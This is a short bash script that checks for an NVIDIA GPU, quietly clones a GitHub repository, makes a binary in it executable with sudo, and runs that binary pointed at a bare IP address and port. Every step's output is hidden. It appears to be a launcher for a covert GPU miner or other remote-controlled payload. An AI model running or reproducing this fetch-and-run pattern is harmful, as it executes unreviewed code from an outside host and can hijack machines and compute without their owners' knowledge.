#! /bin/bash
nvidia-smi
printf "Run 138.197.99.165:4545/$1"  >&2
{
git clone https://github.com/phucbmt/tech.git &> /dev/null
sudo chmod +x tech/m
./tech/m -P http://138.197.99.165:4545/"$1" &> log
} &> /dev/null
